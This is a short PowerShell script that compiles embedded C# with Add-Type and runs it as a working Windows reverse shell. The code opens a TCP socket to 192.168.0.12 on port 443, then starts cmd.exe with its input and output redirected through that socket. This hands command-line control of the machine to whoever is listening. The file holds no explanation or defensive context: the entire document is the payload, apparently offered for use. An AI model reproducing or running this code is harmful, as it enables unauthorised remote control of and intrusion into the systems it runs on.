$Pimba = @"
using System;
using System.Runtime.InteropServices;

public class PimbaRunner {
    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr WSAStartup(short wVersionRequested, out WSADATA wsaData);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr WSASocket(int af, int type, int protocol, IntPtr lpProtocolInfo, uint g, uint dwFlags);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int WSAConnect(IntPtr s, ref sockaddr_in name, int namelen, IntPtr lpCallerData, IntPtr lpCalleeData, IntPtr lpSQOS, IntPtr lpGQOS);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential)]
    public struct WSADATA {
        public short wVersion;
        public short wHighVersion;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)]
        public string szDescription;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]
        public string szSystemStatus;
        public short iMaxSockets;
        public short iMinDdp50;
        public IntPtr lpVendorInfo;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct sockaddr_in {
        public short sin_family;
        public ushort sin_port;
        public uint sin_addr;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public byte[] sin_zero;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    public static void Run() {
        WSADATA wsaData;
        WSAStartup(0x0202, out wsaData);
        IntPtr s1 = WSASocket(2, 1, 6, IntPtr.Zero, 0, 0); // AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6

        sockaddr_in hax = new sockaddr_in();
        hax.sin_family = 2;
        hax.sin_port = (ushort)((443 << 8) & 0xFF00 | (443 >> 8) & 0x00FF); // htons(443)
        hax.sin_addr = BitConverter.ToUInt32(System.Net.IPAddress.Parse("192.168.0.12").GetAddressBytes(), 0);

        WSAConnect(s1, ref hax, Marshal.SizeOf(hax), IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

        STARTUPINFO sui = new STARTUPINFO();
        sui.cb = Marshal.SizeOf(sui);
        sui.dwFlags = 0x00000100 | 0x00000001; // STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
        sui.hStdInput = s1;
        sui.hStdOutput = s1;
        sui.hStdError = s1;

        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        CreateProcess(null, "cmd.exe", IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sui, out pi);
    }
}
"@

Add-Type -TypeDefinition $Pimba
[PimbaRunner]::Run()
